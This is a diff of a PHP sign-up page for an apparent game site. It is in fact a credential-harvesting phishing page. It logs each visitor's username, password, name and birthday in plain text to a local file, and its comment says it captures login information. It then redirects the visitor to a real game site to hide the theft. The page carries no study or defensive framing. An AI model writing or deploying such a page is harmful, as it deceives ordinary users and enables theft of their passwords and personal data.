@@ -2,19 +2,23 @@
 session_start();
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST["username"];
-    $password = $_POST["password"];
-
+    $username =trim($_POST["username"]);
+    $password = trim($_POST["password"]);
+    $name = trim($_POST["name"]);
+    $birthday = trim($_POST["birthday"]);
     // Lay thong tin login vao file log.txt
-    $logData = date("Y-m-d H:i:s") . " - Username: $username, Password: $password\n";
-    file_put_contents("log.txt", $logData, FILE_APPEND);
-
     // chuyen huong sang trang can launch game
-    header("Location: dashboard.php");
-    exit;
+    if(!empty($username)&&!empty($password)&&!empty($name)&&!empty($birthday)){
+        $logData = date("Y-m-d H:i:s") . " - Username: $username, Password: $password, Name: $name, Birthday: $birthday\n";
+        file_put_contents("log.txt", $logData, FILE_APPEND);
+        echo "<script>alert('Sign up successfully');</script>";
+        echo "<script>window.location.href='https://flappybird.io'</script>";
+        exit();
+    } else {
+        echo "<script>alert('Fill full in all fields')</script>";
+    }
 }
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -29,18 +33,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <form action="login.php" method="POST">
             <input type="text" name="username" placeholder="Username, Phone, or Email" required>
             <input type="password" name="password" placeholder="Password" required>
-            <div class="options">
-                <label><input type="checkbox" name="remember"> Remember me</label>
-                <a href="#">Forgot Password?</a>
-            </div>
-            <button type="submit">Log In</button>
-            <div class="divider">OR</div>
-            <button type="button" class="social apple">Log in with Apple</button>
-            <button type="button" class="social google">Log in with Google</button>
-            <button type="button" class="social facebook">Log in with Facebook</button>
-            <p>New? <a href="#">Sign up</a> and start playing!</p>
+            <input type="name" name="name" placeholder="What che name" required>
+            <input type="birthday" name="birthday" placeholder="HPBD" required>
+            <button type="submit">Sign Up</button>
         </form>
     </div>
 </body>
 </html>
-
